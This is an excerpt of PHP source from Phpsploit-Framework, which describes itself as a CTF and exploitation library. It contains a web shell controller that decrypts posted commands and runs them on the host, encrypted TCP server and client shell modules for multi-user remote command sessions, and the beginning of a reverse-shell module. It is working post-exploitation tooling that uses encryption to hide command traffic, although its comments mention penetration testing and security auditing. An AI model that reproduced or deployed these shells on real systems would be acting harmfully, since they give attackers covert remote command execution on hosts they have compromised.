                                            }
                                        }
                                    }
                                }
                                if ( empty( $_client_exit ) && ( ! empty( $item[ 0 ] ) ) && ( $_client_message != "" ) ) {
                                    if ( ! is_cli () ) {
                                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nreceive message from client ( " . $_client_info[ "ip" ] . ":" . $_client_info[ "port" ] . " ) , invitation_code ( " . $_client_info[ "invitation_code" ] . " ) , message : " . print_r ( $_client_message , true ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                                    } else {
                                        Class_Base_Response::outputln ( "\n" . ( "receive message from client ( " . $_client_info[ "ip" ] . ":" . $_client_info[ "port" ] . " ) , invitation_code ( " . $_client_info[ "invitation_code" ] . " ) , message : " . print_r ( $_client_message , true ) ) . "\n" );
                                    }
                                    $_client_message = ( self::get_invitation_code_name ( $item[ 1 ] ) . " : " . $_client_message );
                                    self::send_message ( $item[ 0 ] , $_client_message , $_private_key_resource , $connect_domain_List_id );
                                }
                            }
                            if ( self::count_client_socket_map () <= 0 ) {
                                throw new \Exception( "exit" , 0 );
                            }
                        }
                    }
                } catch ( \Exception $e ) {
                    if ( $e->getMessage () == "exit" ) {
                        Class_Base_Socket::close ( self::$_server_socket );
                        if ( ! is_cli () ) {
                            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "server socket is close , time : " . date ( "Y-m-d H:i:s" , time () ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                        } else {
                            Class_Base_Response::outputln ( "\n" . ( "server socket is close , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" );
                        }
                        break;
                    } else {
                        if ( ! is_cli () ) {
                            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( print_r ( $e , true ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                        } else {
                            Class_Base_Response::outputln ( "\n" . ( print_r ( $e , true ) ) . "\n" );
                        }
                    }
                }
                sleep ( 1 );
            } while ( true );

        } catch ( \Exception $e ) {
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( print_r ( $e , true ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "\n" . ( print_r ( $e , true ) ) . "\n" );
            }
        }
    }

    public static function forwarding_message ( $message , $max_execute_time = 60 , $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        foreach ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ] as $index => $client_socket ) {
            $_write_length = Class_Base_Socket::write ( $client_socket , strlen ( $message ) );
            if ( $_write_length === false ) {
                $_client_info = Class_Base_Socket::getpeername ( $client_socket );
                if ( ! is_cli () ) {
                    Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "Data forwarding failed, receiving end (" . $_client_info[ "ip" ] . ": " . $_client_info[ "port" ] . "), data content: " . $message ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                } else {
                    Class_Base_Response::outputln ( "\n" . ( "Data forwarding failed, receiving end (" . $_client_info[ "ip" ] . ": " . $_client_info[ "port" ] . "), data content: " . $message ) . "\n" );
                }
            }
        }
    }

    public static function fork_process_append_sockets ( $socket , $max_execute_time = 3600 , $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! empty( $socket ) ) && ( is_resource ( $socket ) || ( is_object ( $socket ) ) ) ) {
            $_pid = pcntl_fork ();
            if ( $_pid == -1 ) {
                if ( ! is_cli () ) {
                    Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "Failed to create child process" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                } else {
                    Class_Base_Response::outputln ( "\n" . ( "Failed to create child process" ) . "\n" );
                }
                exit( 1 );
            } else if ( $_pid == 0 ) {
                if ( ! in_array ( $socket , $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ] ) ) {
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS" ][] = $socket;
                    if ( ! is_cli () ) {
                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "The current socket has been added to the socket assembly subkey of the session array" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        Class_Base_Response::outputln ( "\n" . ( "The current socket has been added to the socket assembly subkey of the session array" ) . "\n" );
                    }
                } else {
                    if ( ! is_cli () ) {
                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "The current socket already exists in the socket assembly sub key of the session array" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        Class_Base_Response::outputln ( "\n" . ( "The current socket already exists in the socket assembly sub key of the session array" ) . "\n" );
                    }
                }
            } else {
                if ( ! is_cli () ) {
                    Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "Successfully created socket subprocess, subprocess ID: " . $_pid ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                } else {
                    Class_Base_Response::outputln ( "\n" . ( "Successfully created socket subprocess, subprocess ID: " . $_pid ) . "\n" );
                }
            }
        }
    }

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Guide_CommonCommand_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }

        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "user_commands" ,
                    "describe" => "user_commands" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/user_commands" , array () ) ,
                ) ,
                array (
                    "title"    => "elf_commands" ,
                    "describe" => "elf_commands" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/elf_commands" , array () ) ,
                ) ,
                array (
                    "title"    => "system_commands" ,
                    "describe" => "system_commands" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/system_commands" , array () ) ,
                ) ,
                array (
                    "title"    => "file_commands" ,
                    "describe" => "file_commands" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/file_commands" , array () ) ,
                ) ,
                array (
                    "title"    => "hardware_commands" ,
                    "describe" => "hardware_commands" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/hardware_commands" , array () ) ,
                ) ,
                array (
                    "title"    => "software_commands" ,
                    "describe" => "software_commands" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/software_commands" , array () ) ,
                ) ,
                array (
                    "title"    => "network_commands" ,
                    "describe" => "network_commands" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/network_commands" , array () ) ,
                ) ,
                array (
                    "title"    => "firewall_commands" ,
                    "describe" => "firewall_commands" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/firewall_commands" , array () ) ,
                ) ,
                array (
                    "title"    => "webserver_commands" ,
                    "describe" => "webserver_commands" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/webserver_commands" , array () ) ,
                ) ,
                array (
                    "title"    => "docker_commands" ,
                    "describe" => "docker_commands" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/docker_commands" , array () ) ,
                ) ,
                array (
                    "title"    => "penetration_test_commands" ,
                    "describe" => "penetration_test_commands" ,
                    "href"     => Class_Base_Response::get_url ( "/guide/penetration_test_commands" , array () ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-7
 * Time: 下午1:19
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Logout extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( Class_Base_Auth::is_login () ) ) {
            Class_Base_Auth::disable_login ();
            Class_Base_Auth::disable_license_agreement ();
            if ( ! is_cli () ) {
                Class_Base_Response::redirect ( "/login" );
            } else {
                Class_Base_Response::outputln ( "\n" . 'This command may not be very suitable for command line environments in general!' );
            }
            return null;
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-3
 * Time: 下午4:00
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Shell
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top ::top ();
            $_body   = array (
                "menu"    => Class_View_Shell_Menu ::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function web_shell ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_string = Class_Base_Request ::form ( "string" , Class_Base_Request::TYPE_STRING , "" );
        $_type   = Class_Base_Request ::form ( "type" , Class_Base_Request::TYPE_INTEGER , Class_Base_Security::TYPE_ENCODE_CRYPTO_JS );
        $_key    = ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_KEY" ] ) ? "" : $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_KEY" ] );
        $_iv     = ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_IV" ] ) ? "" : $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_IV" ] );
        $_result = array ();
        if ( ( is_string ( $_string ) ) && ( strlen ( $_string ) > 0 ) && ( is_integer ( $_type ) ) && ( Class_Base_Security ::is_phpsploit_encode_type ( $_type ) ) && ( is_string ( $_key ) ) && ( strlen ( $_key ) > 0 ) && ( is_string ( $_iv ) ) && ( strlen ( $_iv ) > 0 ) ) {
            if ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) {
                $_string = Class_Base_Security ::phpsploit_decode_128 ( $_string , $_key , $_iv );
                if ( ( is_string ( $_string ) ) && ( strlen ( $_string ) > 0 ) ) {
                    $_result                                                          = Class_Base_Shell ::command ( $_string );
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_KEY" ] = "";
                    $_SESSION[ "PHPSPLOIT_FRAMEWORK_JS_ENCODE_SOURCE_CODE_RAND_IV" ]  = "";
                }
            }
        }
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Shell Command Execute</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module function is used to execute shell environment commands. Note: shell commands such as top that require continuous output of results may not be executed properly! Shell environment communication has been encrypted using technical means, and the validity of the communication key is one-time under normal circumstances!</div>';
            $_form        = array (
                "action"    => "/shell/web_shell" ,
                "hiddens"   => array (
                    array (
                        "id"    => "encode_command" ,
                        "name"  => "string" ,
                        "value" => "" ,
                    ) ,
                ) ,
                "selects"   => array (
                    array (
                        "id"      => "algo_type" ,
                        "title"   => "( Encode Type )   : " ,
                        "name"    => "type" ,
                        "options" => array (
                            array ( "describe" => "ENCODE_CRYPTO_JS" , "title" => "ENCODE_CRYPTO_JS" , "value" => Class_Base_Security::TYPE_ENCODE_CRYPTO_JS , "selected" => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? "selected" : "" ) ) ,
                        ) ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "algo_key" ,
                        "title"    => "( Encode Key ) : " ,
                        "describe" => "key" ,
                        "name"     => "key" ,
                        "value"    => "" ,
                    ) ,
                    array (
                        "id"       => "algo_iv" ,
                        "title"    => "( Encode IV ) : " ,
                        "describe" => "iv" ,
                        "name"     => "iv" ,
                        "value"    => "" ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"    => "show_command" ,
                        "title" => "( Shell Command )   : " ,
                        "name"  => "show_string" ,
                        "value" => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? ( empty( $_string ) ? ( "" ) : Class_Base_Security ::phpsploit_encode_128 ( $_string , $_key , $_iv ) ) : ( $_string ) ) ,
                    ) ,
                    array (
                        "id"       => "result_data" ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( ( $_type == Class_Base_Security::TYPE_ENCODE_CRYPTO_JS ) ? ( empty( $_result ) ? ( "" ) : Class_Base_Security ::phpsploit_encode_128 ( print_r ( $_result , true ) , $_key , $_iv ) ) : ( $_result ) ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Shell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">
function init(){ 
    document.getElementById("algo_key").value=aes_key;
    document.getElementById("algo_iv").value=aes_iv;
    if(document.getElementById("show_command").value!==""){
       document.getElementById("show_command").value=phpsploit_decode(document.getElementById("show_command").value,"' . $_key . '","' . $_iv . '");
    }
    if(document.getElementById("result_data").value!==""){
    document.getElementById("result_data").value=phpsploit_decode(document.getElementById("result_data").value,"' . $_key . '","' . $_iv . '"); 
    }
}
function to_submit(form_object){ 
    form_object.string.value=phpsploit_encode(document.getElementById("show_command").value,document.getElementById("algo_key").value,document.getElementById("algo_iv").value);
    document.getElementById("show_command").value=""; 
    console.log(phpsploit_decode(form_object.string.value,document.getElementById("algo_key").value,document.getElementById("algo_iv").value)); 
    document.getElementById("algo_key").value="";
    document.getElementById("algo_iv").value="";
    console.log("form is submit"); 
    return true;
}
    </script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function server_shell_client ()
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        $_server_ip        = Class_Base_Request ::form ( "ip" , Class_Base_Request::TYPE_STRING , "" );
        $_server_port      = Class_Base_Request ::form ( "port" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_token            = Class_Base_Request ::form ( "token" , Class_Base_Request::TYPE_STRING , "" );
        $_encode_key       = Class_Base_Request ::form ( "encode_key" , Class_Base_Request::TYPE_STRING , "" );
        $_encode_iv_base64 = Class_Base_Request ::form ( "encode_iv_base64" , Class_Base_Request::TYPE_STRING , "" );

        if ( ! is_cli () ) {
            $_cli_url        = Class_Base_Response ::get_cli_url ( "/shell/server_shell_client" , array ( "ip" => $_server_ip , "port" => $_server_port , "token" => $_token , "encode_key" => $_encode_key , "encode_iv_base64" => $_encode_iv_base64 ) );
            $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_result_data_id = "result_data";
            $_result         = "";
            $_result         .= "\n" . 'cli url : ' . $_cli_url . "\n";
            $_result         .= "\n" . 'cli encode url : ' . $_cli_encode_url . "\n";
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Shell Command Execute Client</div>';
            $_form_top       .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module functions as a shell environment client for bidirectional communication with the shell environment server. The transmission data has been technically encrypted, and the communication key is only valid in the current shell environment server! The current interface is only used to create command line parameters for Shell environment clients and does not directly establish a connection with Shell environment servers. If you want to establish a connection and communicate with the server, you need to execute a command with this syntax in the command line environment: php -f ' . htmlentities ( '<Build Phpsploit Framework Project file path> <cli encode URL>' ) . '</div>';
            $_form           = array (
                "action"    => "/shell/server_shell_client" ,
                "inputs"    => array (
                    array (
                        "id"       => "server_ip" ,
                        "title"    => "( Server IP Address ) : " ,
                        "describe" => "Server IP Address" ,
                        "name"     => "ip" ,
                        "value"    => ( ( ! empty( $_server_ip ) ) ? ( $_server_ip ) : ( '127.0.0.1' ) ) ,
                    ) ,
                    array (
                        "id"       => "server_port" ,
                        "title"    => "( Server IP Port ) : " ,
                        "describe" => "Server IP Port" ,
                        "name"     => "port" ,
                        "value"    => ( ( ! empty( $_server_port ) ) ? ( $_server_port ) : ( 0 ) ) ,
                    ) ,
                    array (
                        "id"       => "token" ,
                        "title"    => "( Auth Token ) : " ,
                        "describe" => "Auth Token" ,
                        "name"     => "token" ,
                        "value"    => ( ( ! empty( $_token ) ) ? ( $_token ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "encode_key" ,
                        "title"    => "( Encode Key ) : " ,
                        "describe" => "Encode Key" ,
                        "name"     => "encode_key" ,
                        "value"    => ( ( ! empty( $_encode_key ) ) ? ( $_encode_key ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "encode_iv_base64" ,
                        "title"    => "( Encode IV Base64 ) : " ,
                        "describe" => "Encode IV Base64" ,
                        "name"     => "encode_iv_base64" ,
                        "value"    => ( ( ! empty( $_encode_iv_base64 ) ) ? ( ( str_replace ( ' ' , '+' , $_encode_iv_base64 ) ) ) : ( '' ) ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => $_result_data_id ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( $_result ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
            );
            $_top            = Class_View_Top ::top ();
            $_body           = array (
                "menu"    => Class_View_Shell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content        = '<div></div>';
            $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom         = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            if ( is_cli () ) {
                if ( ( is_string ( $_server_ip ) ) && ( strlen ( $_server_ip ) > 0 ) && ( ( Class_Base_Format ::is_ipv4_address ( $_server_ip ) ) || ( Class_Base_Format ::is_ipv6_address ( $_server_ip ) ) ) && ( is_integer ( $_server_port ) ) && ( ( ( $_server_port ) > 0 ) && ( $_server_port < 65536 ) ) && ( ( is_string ( $_token ) ) && ( strlen ( $_token ) == 32 ) ) && ( ( is_string ( $_encode_key ) ) && ( strlen ( $_encode_key ) == 32 ) ) && ( ( ! empty( $_encode_iv_base64 ) ) && ( is_string ( $_encode_iv_base64 ) ) && ( strlen ( $_encode_iv_base64 ) < 256 ) ) ) {
                    Class_Operate_SocketServerShell ::start_client ( $_server_ip , $_server_port , $_token , $_encode_key , $_encode_iv_base64 );
                }
            }
        }
        return null;

    }

    public static function server_shell ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_start              = Class_Base_Request ::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_listen_ip          = Class_Base_Request ::form ( "ip" , Class_Base_Request::TYPE_STRING , "" );
        $_listen_port        = Class_Base_Request ::form ( "port" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_max_connect_number = Class_Base_Request ::form ( "max_connect_number" , Class_Base_Request::TYPE_INTEGER , 1 );
        $_max_execute_time   = Class_Base_Request ::form ( "max_execute_time" , Class_Base_Request::TYPE_INTEGER , 3600 );
        $_cli_url            = Class_Base_Response ::get_cli_url ( "/shell/server_shell" , array ( "start" => 1 , "ip" => $_listen_ip , "port" => $_listen_port , "max_connect_number" => $_max_connect_number , "max_execute_time" => $_max_connect_number ) );
        $_cli_encode_url     = Class_Base_Response ::get_urlencode ( $_cli_url );
        $_result             = "";
        if ( empty( $_start ) ) {
            $_result .= ( 'cli url : ' . $_cli_url ) . "\n\n" . ( 'cli encode url : ' . ( $_cli_encode_url ) ) . "\n\n";
        }
        $_connect_domain_List_id = "result_data";
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Shell Command Execute Server</div>';
            $_form_top    .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This is a Server Shell environment based on TCP protocol connection (which can support team collaboration environment and is suitable for team combat mode during CTF competitions) , using temporarily issued communication tokens for communication identity authentication. Note that all tokens issued in this instance are only valid in the server shell environment created in that instance. When the Server Shell environment is shut down and restarted again, a new communication token will be generated, and the old communication token will become invalid!You need to provide the generated "token, decode_key, decode_iv" information to the client of the shell environment for successful establishment and execution of bidirectional communication (when the client of the shell environment fails to obtain the correct "token, decode_key, decode_iv" information, normal communication connection cannot be established with the server of the shell environment). If you want to stop this instance of the server shell environment, you need Call the client of the shell environment, And send the" exit "command to end the current instance of the shell environment running on the server. If you only want to end the communication connection established between the current instance and the server shell environment, you only need to use the client of the shell environment to send the" quit "command to the server of the shell environment. Warning! When you start a server shell environment instance in the web interface, other functions in the current web environment will become unusable! If the target host for your current penetration testing or security audit behavior is still running other businesses, you should never use this feature in the web environment, as it will make other businesses in the web environment unusable! The functionality of this module is currently only applicable to web environments without other business operations, as well as relatively independent command-line environments!</div>';
            $_form_name   = "form_0";
            $_form        = array (
                "action"    => "/shell/server_shell" ,
                "id"        => $_form_name ,
                "name"      => $_form_name ,
                "hiddens"   => array (
                    array (
                        "id"    => "start" ,
                        "name"  => "start" ,
                        "value" => 1 ,
                    ) ,
                ) ,
                "inputs"    => array (
                    array (
                        "id"       => "listen_ip" ,
                        "title"    => "( Listen IP Address ) : " ,
                        "describe" => "listen IP Address" ,
                        "name"     => "ip" ,
                        "value"    => ( ( ! empty( $_listen_ip ) ) ? ( $_listen_ip ) : ( '127.0.0.1' ) ) ,
                    ) ,
                    array (
                        "id"       => "listen_port" ,
                        "title"    => "( Listen IP Port ) : " ,
                        "describe" => "listen IP Port" ,
                        "name"     => "port" ,
                        "value"    => ( ( ! empty( $_listen_port ) ) ? ( $_listen_port ) : ( rand ( 40000 , 49999 ) ) ) ,
                    ) ,
                    array (
                        "id"       => "max_connect_number" ,
                        "title"    => "( Max Connect Number ) : " ,
                        "describe" => "Max Connect Number" ,
                        "name"     => "max_connect_number" ,
                        "value"    => $_max_connect_number ,
                    ) ,
                    array (
                        "id"       => "max_execute_time" ,
                        "title"    => "( Max Execute Time ) : " ,
                        "describe" => "Max Execute Time" ,
                        "name"     => "max_execute_time" ,
                        "value"    => $_max_execute_time ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => $_connect_domain_List_id ,
                        "title"    => "( Result Data )   : " ,
                        "name"     => "result" ,
                        "value"    => ( $_result ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "id"    => "submit_form" ,
                    "type"  => "submit" ,
                    "title" => "( Start Shell Server Environment )" ,
                    "name"  => "submit_form" ,
                    "value" => "start shell server" ,
                ) ,
                "reset"     => array (
                    "id"    => "reset_form" ,
                    "type"  => "reset" ,
                    "title" => "( Reset Shell Server Environment Configuration Information )" ,
                    "name"  => "reset_form" ,
                    "value" => "reset configuration" ,
                ) ,
                "button"    => array (
                    "id"      => "button_form" ,
                    "type"    => "button" ,
                    "title"   => "( Create Shell Server Environment CLI Encode URL )" ,
                    "name"    => "button_form" ,
                    "value"   => "create cli encode url" ,
                    "display" => true ,
                    "events"  => array (
                        "onclick" => 'create_encode_url();' ,
                    ) ,
                ) ,
            );
            $_top         = Class_View_Top ::top ();
            $_body        = array (
                "menu"    => Class_View_Shell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content     = '<div></div>';
            $_javascript  = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;} function create_encode_url(){ document.getElementById("start").value=0;if(document.forms["' . htmlentities ( $_form_name ) . '"].onsubmit()!=false){document.forms["' . htmlentities ( $_form_name ) . '"].submit();} }</script>';
            $_bottom      = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        if ( ( ! empty( $_start ) ) && ( is_string ( $_listen_ip ) ) && ( strlen ( $_listen_ip ) > 0 ) && ( ( Class_Base_Format ::is_ipv4_address ( $_listen_ip ) ) || ( Class_Base_Format ::is_ipv6_address ( $_listen_ip ) ) ) && ( is_integer ( $_listen_port ) ) && ( ( ( $_listen_port ) > 0 ) && ( $_listen_port < 65536 ) ) && ( is_integer ( $_max_connect_number ) ) && ( ( $_max_connect_number <= 10 ) ) && ( is_integer ( $_max_execute_time ) ) && ( $_max_execute_time >= 0 ) && ( is_string ( $_connect_domain_List_id ) ) ) {
            Class_Operate_SocketServerShell ::start ( $_listen_ip , $_listen_port , $_max_connect_number , $_max_execute_time , $_connect_domain_List_id );
        }
        return null;
    }

    public static function reverse_shell ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_start                  = Class_Base_Request ::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_listen_ip              = Class_Base_Request ::form ( "ip" , Class_Base_Request::TYPE_STRING , "" );
        $_listen_port            = Class_Base_Request ::form ( "port" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_max_connect_number     = Class_Base_Request ::form ( "max_connect_number" , Class_Base_Request::TYPE_INTEGER , 1 );
        $_max_execute_time       = Class_Base_Request ::form ( "max_execute_time" , Class_Base_Request::TYPE_INTEGER , 3600 );
        $_connect_domain_List_id = "result_data";
        $_form_listen_ip         = ( ( ! empty( $_listen_ip ) ) ? ( $_listen_ip ) : ( '127.0.0.1' ) );
        $_form_listen_port       = ( ( ! empty( $_listen_port ) ) ? ( $_listen_port ) : ( rand ( 40000 , 49999 ) ) );
        $_cli_url                = Class_Base_Response ::get_cli_url ( "/shell/reverse_shell" , array ( "start" => 1 , "ip" => $_form_listen_ip , "port" => $_form_listen_port , "max_connect_number" => $_max_connect_number , "max_execute_time" => $_max_connect_number ) );
        $_cli_encode_url         = Class_Base_Response ::get_urlencode ( $_cli_url );
        $_result                 = "";
        if ( empty( $_start ) ) {
            $_result .= ( 'cli url : ' . $_cli_url ) . "\n\n" . ( 'cli encode url : ' . ( $_cli_encode_url ) ) . "\n\n";
        }
        if ( ! is_cli () ) {
            $_form_top    = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Reverse Shell Connection To Client</div>';
